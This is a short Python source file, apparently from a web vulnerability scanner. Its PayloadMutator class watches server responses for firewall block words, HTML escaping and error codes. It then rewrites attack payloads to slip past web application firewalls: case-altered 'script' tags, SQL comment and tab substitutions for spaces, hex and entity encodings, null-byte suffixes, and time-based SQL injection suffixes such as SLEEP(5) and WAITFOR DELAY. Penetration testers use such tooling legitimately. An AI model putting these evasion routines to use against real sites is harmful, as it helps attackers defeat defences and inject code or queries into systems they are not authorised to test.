from __future__ import annotations

from typing import Any


class PayloadMutator:
    """Generate payload variants in response to failure signals."""

    @staticmethod
    def adapt(payload: str, response: Any) -> list[str]:
        text = (getattr(response, "text", "") or "").lower()
        status = int(getattr(response, "status_code", 0) or 0)
        variants: list[str] = []

        # WAF / block words
        waf_keywords = ["blocked", "suspicious", "attack", "firewall"]
        if any(w in text for w in waf_keywords):
            variants.extend(PayloadMutator._waf_bypass(payload))

        # Encoding hints
        if any(e in text for e in ["&lt;", "&gt;", "&#39;", "&quot;"]):
            variants.extend(PayloadMutator._encoding_bypass(payload))

        # Server errors / timing
        if status >= 500:
            variants.extend([payload + ";", payload + "\\n", payload + "\\x00"])

        # Timing strategies
        if status == 504:
            variants.extend([payload + " AND SLEEP(5)", payload + " WAITFOR DELAY '00:00:05'"])

        # Always include original payload as a fallback if no variants
        if not variants:
            variants.append(payload)

        # Deduplicate while preserving order
        seen = set()
        uniq = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                uniq.append(v)
        return uniq

    @staticmethod
    def _waf_bypass(payload: str) -> list[str]:
        return [
            payload.replace("<", "\\x3c").replace(">", "\\x3e"),
            payload.replace("script", "scRipt"),
            payload.replace("script", "Script"),
            payload.replace(" ", "/**/"),
            payload.replace(" ", "\\t"),
            payload.replace(" ", "\\n"),
        ]

    @staticmethod
    def _encoding_bypass(payload: str) -> list[str]:
        return [
            payload.replace("'", "\\'"),
            payload.replace('"', '\\"'),
            payload.replace("'", "&#39;"),
            payload.replace('"', "&quot;"),
            payload.replace("<", "&lt;"),
            payload.replace(">", "&gt;"),
            payload.replace(" ", "%20"),
            payload.replace(" ", "%09"),
        ]
